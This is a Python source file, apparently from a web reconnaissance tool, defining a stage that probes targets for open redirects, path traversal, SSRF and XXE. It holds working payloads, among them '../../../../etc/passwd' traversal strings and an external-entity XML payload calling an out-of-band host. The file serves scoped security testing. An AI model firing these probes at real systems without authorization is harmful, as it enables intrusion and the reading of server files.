from __future__ import annotations

import json
import logging
import re
import asyncio
import hashlib
import uuid
from collections import defaultdict
from typing import Dict, List, Optional, Set, Tuple, Any
from urllib.parse import parse_qsl, unquote, urlencode, urlparse, urlunparse

from recon_cli.pipeline.context import PipelineContext
from recon_cli.pipeline.stages.core.stage_base import Stage, note_missing_tool
from recon_cli.utils.oast import InteractshSession
from recon_cli.utils.async_http import AsyncHTTPClient, HTTPClientConfig, HTTPResponse
from recon_cli.utils import time as time_utils

LOGGER = logging.getLogger(__name__)


class ExtendedValidationStage(Stage):
    name = "extended_validation"

    REDIRECT_PARAMS = {"next", "redirect", "return", "url", "dest", "callback"}
    SSRF_PARAMS = {"url", "uri", "link", "host", "domain", "site", "callback", "dest"}
    LFI_PARAMS = {"file", "path", "page", "template", "include", "download", "doc"}
    HEADER_SSRF_HEADERS = (
        "X-Forwarded-Host", "X-Forwarded-Server", "X-Host", "X-Original-Host", "X-Forwarded-For",
    )

    LFI_LINUX_RE = re.compile(r"root:.*:0:0:", re.IGNORECASE)
    LFI_WIN_RE = re.compile(r"\[(extensions|fonts|mci extensions)\]", re.IGNORECASE)
    VALUE_DOMAIN_RE = re.compile(r"^[a-z0-9.-]+\.[a-z]{2,}$", re.IGNORECASE)
    VALUE_FILE_RE = re.compile(r"\.[a-z0-9]{2,5}$", re.IGNORECASE)

    def is_enabled(self, context: PipelineContext) -> bool:
        return bool(getattr(context.runtime_config, "enable_extended_validation", False))

    async def _request_with_retries(self, client: AsyncHTTPClient, method: str, url: str, **kwargs) -> HTTPResponse:
        """Wrapper for testing and specialized retries."""
        return await client._request(method=method, url=url, **kwargs)

    async def run_async(self, context: PipelineContext) -> None:
        runtime = context.runtime_config
        enable_oast = bool(getattr(runtime, "enable_oast_validation", True))
        oast_backend = str(getattr(runtime, "oast_backend", "interactsh")).lower()
        enable_redirect = bool(getattr(runtime, "enable_redirect_validation", True))
        enable_lfi = bool(getattr(runtime, "enable_lfi_validation", True))
        enable_header = bool(getattr(runtime, "enable_header_validation", True))

        redirect_max_urls = int(getattr(runtime, "redirect_max_urls", 40))
        lfi_max_urls = int(getattr(runtime, "lfi_max_urls", 40))
        oast_max_targets = int(getattr(runtime, "oast_max_targets", 40))
        oast_max_per_host = int(getattr(runtime, "oast_max_per_host", 8))
        header_max_urls = int(getattr(runtime, "header_validation_max_urls", 30))
        timeout = int(getattr(runtime, "oast_timeout", 10))
        
        # Hard Probe Cap (Phase 3 Requirement)
        max_total_probes = int(getattr(runtime, "extended_validation_max_probes", 500))
        
        candidates = self._collect_candidates(context, context.signal_index())
        if not candidates:
            context.logger.info("extended validation: no candidates")
            return

        artifacts_dir = context.record.paths.ensure_subdir("extended_validation")
        probes: List[Dict[str, object]] = []
        findings = 0
        confirmed_keys: Set[Tuple[str, str]] = set()
        stats = context.record.metadata.stats.setdefault("extended_validation", {})
        baseline_cache: Dict[Tuple[str, str, str, str], Tuple[int, str]] = {}

        client_config = HTTPClientConfig(
            max_concurrent=20,
            total_timeout=float(timeout),
            verify_ssl=bool(getattr(runtime, "verify_tls", True)),
            requests_per_second=float(getattr(runtime, "oast_rps", 25.0))
        )

        probe_cap_hit = False

        async with AsyncHTTPClient(client_config, context=context) as client:
            # 1. Redirect Validation
            if enable_redirect:
                for entry in candidates["redirect"][:redirect_max_urls]:
                    if len(probes) >= max_total_probes:
                        probe_cap_hit = True
                        break
                    
                    url = entry["url"]
                    token = self._token()
                    payload = f"https://example.com/{token}"
                    test_url, method, data, json_body = self._prepare_payload_request(entry, payload)
                    if not context.url_allowed(test_url): continue
                    
                    try:
                        resp = await self._request_with_retries(client, method=method, url=test_url, headers=context.auth_headers({"User-Agent": "recon-cli redirect-validate"}), data=data, json=json_body, follow_redirects=False)
                        location = str(resp.headers.get("Location", ""))
                        probes.append({"type": "redirect_probe", "url": test_url, "param": entry["param"], "payload": payload, "status": resp.status, "location": location})
                        
                        if resp.status in {301, 302, 303, 307, 308} and self._is_open_redirect(url, location, payload):
                            if (url, "open_redirect") not in confirmed_keys:
                                confirmed_keys.add((url, "open_redirect"))
                                signal_id = context.emit_signal("open_redirect_confirmed", "url", url, confidence=0.8, source=self.name, tags=["redirect", "confirmed"], evidence={"location": location})
                                finding = {
                                    "type": "finding", "finding_type": "open_redirect", "source": self.name, "url": url, "hostname": urlparse(url).hostname,
                                    "description": "Open redirect confirmed via Location header", "details": {"probe_url": test_url, "location": location},
                                    "tags": ["redirect", "confirmed"], "score": 80, "priority": "high", "severity": "high", "evidence_id": signal_id or None,
                                }
                                if context.results.append(finding): findings += 1
                    except Exception: continue

            # 2. LFI Validation
            if enable_lfi and not probe_cap_hit:
                for entry in candidates["lfi"][:lfi_max_urls]:
                    if len(probes) >= max_total_probes:
                        probe_cap_hit = True
                        break
                    
                    url = entry["url"]
                    b_key = (url, str(entry.get("param")), str(entry.get("location")), str(entry.get("method")))
                    if b_key not in baseline_cache:
                        baseline_cache[b_key] = await self._fetch_baseline(context, client, entry)
                    
                    b_status, b_body = baseline_cache[b_key]
                    b_has_sig = bool(b_body and self._looks_like_lfi(b_body))
                    
                    for payload in ("../../../../etc/passwd", "..\\..\\..\\windows\\win.ini"):
                        if len(probes) >= max_total_probes:
                            probe_cap_hit = True
                            break
                        
                        test_url, method, data, json_body = self._prepare_payload_request(entry, payload)
                        if not context.url_allowed(test_url): continue
                        
                        try:
                            resp = await self._request_with_retries(client, method=method, url=test_url, headers=context.auth_headers({"User-Agent": "recon-cli lfi-validate"}), data=data, json=json_body)
                            body = resp.body[:4000]
                            probes.append({"type": "lfi_probe", "url": test_url, "param": entry["param"], "payload": payload, "status": resp.status})
                            
                            if not b_has_sig and resp.status < 400 and len(body) > 200 and self._looks_like_lfi(body):
                                if (url, "lfi") not in confirmed_keys:
                                    confirmed_keys.add((url, "lfi"))
                                    signal_id = context.emit_signal("lfi_confirmed", "url", url, confidence=0.8, source=self.name, tags=["lfi", "confirmed"], evidence={"payload": payload})
                                    finding = {
                                        "type": "finding", "finding_type": "lfi", "source": self.name, "url": url, "hostname": urlparse(url).hostname,
                                        "description": "Local File Inclusion confirmed via response signature", "details": {"probe_url": test_url, "payload": payload},
                                        "tags": ["lfi", "confirmed"], "score": 85, "priority": "high", "severity": "high", "evidence_id": signal_id or None,
                                    }
                                    if context.results.append(finding): findings += 1
                                    break
                        except Exception: continue

            # 3. OAST Validation (SSRF / XXE)
            oast_tokens = {}
            interactions = []
            if enable_oast and oast_backend == "interactsh" and not probe_cap_hit:
                session = InteractshSession(artifacts_dir / "interactsh.json", logger=context.logger, domain_override=getattr(runtime, "oast_domain", None))
                if session.start():
                    try:
                        # SSRF
                        for entry in candidates["ssrf"][:oast_max_targets]:
                            if len(probes) >= max_total_probes:
                                probe_cap_hit = True
                                break
                            
                            token = self._token()
                            oast_url = session.make_url(token)
                            test_url, method, data, json_body = self._prepare_payload_request(entry, oast_url)
                            if not context.url_allowed(test_url): continue
                            
                            try:
                                resp = await self._request_with_retries(client, method=method, url=test_url, headers=context.auth_headers({"User-Agent": "recon-cli ssrf-validate"}), data=data, json=json_body)
                                oast_tokens[token] = {"type": "ssrf", "url": entry["url"], "param": entry["param"], "probe": test_url}
                                probes.append({"type": "ssrf_probe", "url": test_url, "param": entry["param"], "oast_url": oast_url, "status": resp.status})
                            except Exception: continue

                        # XXE
                        if not probe_cap_hit:
                            for entry in candidates["xxe"][:oast_max_targets]:
                                if len(probes) >= max_total_probes:
                                    probe_cap_hit = True
                                    break
                                
                                token = self._token()
                                oast_url = session.make_url(token)
                                test_url = entry["url"]
                                try:
                                    resp = await client.post(test_url, headers=context.auth_headers({"Content-Type": "application/xml"}), data=self._xxe_payload(oast_url))
                                    oast_tokens[token] = {"type": "xxe", "url": test_url, "probe": test_url}
                                    probes.append({"type": "xxe_probe", "url": test_url, "oast_url": oast_url, "status": resp.status})
                                except Exception: continue

                        # Header SSRF
                        if enable_header and not probe_cap_hit:
                            for url in self._select_header_candidates(candidates, header_max_urls):
                                if len(probes) >= max_total_probes:
                                    probe_cap_hit = True
                                    break
                                
                                token = self._token()
                                oast_url = session.make_url(token)
                                oast_host = urlparse(oast_url).hostname or oast_url
                                headers = context.auth_headers({"User-Agent": "recon-cli ssrf-header"})
                                for hname in self.HEADER_SSRF_HEADERS: headers[hname] = oast_host
                                
                                try:
                                    resp = await client.get(url, headers=headers)
                                    oast_tokens[token] = {"type": "ssrf", "url": url, "param": "header", "probe": url}
                                    probes.append({"type": "ssrf_header_probe", "url": url, "oast_url": oast_url, "status": resp.status})
                                except Exception: continue

                        if oast_tokens:
                            await asyncio.sleep(getattr(runtime, "oast_wait_seconds", 30))
                            collected = session.collect_interactions(list(oast_tokens.keys()))
                            interactions = [i.raw for i in collected]
                            for inter in collected:
                                info = oast_tokens.get(inter.token)
                                if not info or (info["url"], info["type"]) in confirmed_keys: continue
                                
                                confirmed_keys.add((info["url"], info["type"]))
                                signal_id = context.emit_signal(f"{info['type']}_confirmed", "url", info["url"], confidence=0.8, source=self.name, tags=[info["type"], "confirmed"], evidence={"interaction": inter.raw})
                                finding = {
                                    "type": "finding", "finding_type": info["type"], "source": self.name, "url": info["url"], "hostname": urlparse(info["url"]).hostname,
                                    "description": f"{info['type'].upper()} confirmed via OAST interaction", "details": {"probe": info["probe"], "interaction": inter.raw},
                                    "tags": [info["type"], "confirmed", "oast"], "score": 90, "priority": "high", "severity": "critical" if info["type"] == "ssrf" else "high", "evidence_id": signal_id or None,
                                }
                                if context.results.append(finding): findings += 1
                    finally:
                        session.stop()

        # Finalize
        artifact_path = artifacts_dir / "extended_validation.json"
        artifact_path.write_text(json.dumps({"probes": probes, "interactions": interactions, "findings": findings}, indent=2, sort_keys=True), encoding="utf-8")
        stats.update({
            "probes": len(probes), 
            "findings": findings, 
            "artifact": str(artifact_path.relative_to(context.record.paths.root)),
            "probe_cap_hit": probe_cap_hit,
            "max_total_probes": max_total_probes
        })
        context.manager.update_metadata(context.record)

    def _collect_candidates(self, context: PipelineContext, signals: Dict[str, Any]) -> Dict[str, List[Dict[str, Any]]]:
        redirect_map, ssrf_map, lfi_map, xxe_map = {}, {}, {}, {}
        for entry in context.iter_results():
            etype = entry.get("type")
            if etype == "url": self._process_url_entry(entry, context, signals, redirect_map, ssrf_map, lfi_map, xxe_map)
            elif etype == "parameter": self._process_parameter_entry(entry, context, signals, redirect_map, ssrf_map, lfi_map)
            elif etype == "form": self._process_form_entry(entry, context, redirect_map, ssrf_map, lfi_map)

        return {
            "redirect": sorted(redirect_map.values(), key=lambda x: int(x["score"]), reverse=True),
            "ssrf": sorted(ssrf_map.values(), key=lambda x: int(x["score"]), reverse=True),
            "lfi": sorted(lfi_map.values(), key=lambda x: int(x["score"]), reverse=True),
            "xxe": sorted(xxe_map.values(), key=lambda x: int(x["score"]), reverse=True)
        }

    def _process_url_entry(self, entry, context, signals, redirect_map, ssrf_map, lfi_map, xxe_map):
        url = entry.get("url")
        if not url or not context.url_allowed(url) or not url.startswith("http"): return
        host = urlparse(url).hostname or ""
        if "waf_detected" in signals.get("by_host", {}).get(host, set()) and "waf_bypass_possible" not in signals.get("by_host", {}).get(host, set()): return

        for key, value in parse_qsl(urlparse(url).query, keep_blank_values=True):
            k_low = key.lower()
            score = int(entry.get("score", 0))
            if k_low in self.REDIRECT_PARAMS: redirect_map[(url, k_low)] = self._pick_best(redirect_map.get((url, k_low)), {"url": url, "param": key, "method": "get", "score": self._adjust_score(score, "redirect", value)})
            if k_low in self.SSRF_PARAMS: ssrf_map[(url, k_low)] = self._pick_best(ssrf_map.get((url, k_low)), {"url": url, "param": key, "method": "get", "score": self._adjust_score(score, "ssrf", value)})
            if k_low in self.LFI_PARAMS: lfi_map[(url, k_low)] = self._pick_best(lfi_map.get((url, k_low)), {"url": url, "param": key, "method": "get", "score": self._adjust_score(score, "lfi", value)})

    def _process_parameter_entry(self, entry, context, signals, redirect_map, ssrf_map, lfi_map):
        name = str(entry.get("name")).lower()
        if name not in (self.REDIRECT_PARAMS | self.SSRF_PARAMS | self.LFI_PARAMS): return
        for ex in entry.get("examples", []):
            if not ex or not ex.startswith("http") or not context.url_allowed(ex): continue
            score = int(entry.get("score", 0))
            if name in self.REDIRECT_PARAMS: redirect_map[(ex, name)] = self._pick_best(redirect_map.get((ex, name)), {"url": ex, "param": name, "method": "get", "score": score})
            if name in self.SSRF_PARAMS: ssrf_map[(ex, name)] = self._pick_best(ssrf_map.get((ex, name)), {"url": ex, "param": name, "method": "get", "score": score})
            if name in self.LFI_PARAMS: lfi_map[(ex, name)] = self._pick_best(lfi_map.get((ex, name)), {"url": ex, "param": name, "method": "get", "score": score})

    def _process_form_entry(self, entry, context, redirect_map, ssrf_map, lfi_map):
        action = entry.get("action") or entry.get("url")
        if not action or not action.startswith("http") or not context.url_allowed(action): return
        method = str(entry.get("method", "post")).lower()
        for item in entry.get("inputs", []):
            name = str(item.get("name")).lower()
            score = int(entry.get("score", 25))
            loc = "body" if method in {"post", "put", "patch"} else "query"
            if name in self.REDIRECT_PARAMS: redirect_map[(action, name)] = self._pick_best(redirect_map.get((action, name)), {"url": action, "param": name, "location": loc, "method": method, "score": score})
            if name in self.SSRF_PARAMS: ssrf_key = (action, name); ssrf_map[ssrf_key] = self._pick_best(ssrf_map.get(ssrf_key), {"url": action, "param": name, "location": loc, "method": method, "score": score})
            if name in self.LFI_PARAMS: lfi_key = (action, name); lfi_map[lfi_key] = self._pick_best(lfi_map.get(lfi_key), {"url": action, "param": name, "location": loc, "method": method, "score": score})

    @staticmethod
    def _token() -> str: return uuid.uuid4().hex[:10]

    def _prepare_payload_request(self, entry: Dict[str, Any], payload: str) -> Tuple[str, str, Any, Any]:
        url, param, method = entry["url"], entry["param"], entry.get("method", "get").lower()
        if entry.get("location") == "query" or method == "get":
            parsed = urlparse(url)
            params = parse_qsl(parsed.query, keep_blank_values=True)
            updated = []
            replaced = False
            for k, v in params:
                if k == param and not replaced: updated.append((k, payload)); replaced = True
                else: updated.append((k, v))
            if not replaced: updated.append((param, payload))
            return urlunparse(parsed._replace(query=urlencode(updated, doseq=True))), "get", None, None
        return url, method, {param: payload}, None

    def _is_open_redirect(self, original_url: str, location: str, payload: str) -> bool:
        if not location: return False
        token = payload.rsplit("/", 1)[-1]
        if payload not in location and (token and token not in location): return False
        try:
            p_orig, p_loc = urlparse(original_url), urlparse(location.strip().replace("//", "http://", 1) if location.strip().startswith("//") else location.strip())
            if not p_loc.scheme or not p_loc.netloc: return False
            return p_orig.hostname.lower() != p_loc.hostname.lower()
        except Exception: return False

    @staticmethod
    def _pick_best(existing: Optional[Dict[str, Any]], candidate: Dict[str, Any]) -> Dict[str, Any]:
        if not existing: return candidate
        return candidate if int(candidate["score"]) > int(existing["score"]) else existing

    def _looks_like_lfi(self, body: str) -> bool:
        return bool(body and (self.LFI_LINUX_RE.search(body) or self.LFI_WIN_RE.search(body)))

    async def _fetch_baseline(self, context: PipelineContext, client: AsyncHTTPClient, entry: Dict[str, Any]) -> Tuple[int, str]:
        url, method, data, json_body = self._prepare_payload_request(entry, "recon_baseline")
        try:
            resp = await client._request(method=method, url=url, headers=context.auth_headers({"User-Agent": "recon-cli lfi-baseline"}), data=data, json=json_body)
            return resp.status, resp.body[:4000]
        except Exception: return 0, ""

    @staticmethod
    def _xxe_payload(oast_url: str) -> str:
        return f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{oast_url}">]><foo>&xxe;</foo>'

    @staticmethod
    def _select_header_candidates(candidates: Dict[str, List[Dict[str, Any]]], limit: int) -> List[str]:
        urls = []
        seen = set()
        for e in candidates.get("ssrf", []):
            if e["url"] not in seen:
                seen.add(e["url"]); urls.append(e["url"])
                if limit > 0 and len(urls) >= limit: break
        return urls

    def _adjust_score(self, base_score: int, kind: str, value: str) -> int:
        if not value: return base_score
        decoded = unquote(str(value)).strip().lower()
        boost = 0
        if kind in {"redirect", "ssrf"}:
            if decoded.startswith(("http", "//")): boost += 12
            elif self.VALUE_DOMAIN_RE.match(decoded): boost += 8
        elif kind == "lfi":
            if any(s in decoded for s in ("/", "\\", "..")): boost += 8
            elif self.VALUE_FILE_RE.search(decoded): boost += 5
        return max(base_score + boost, 0)
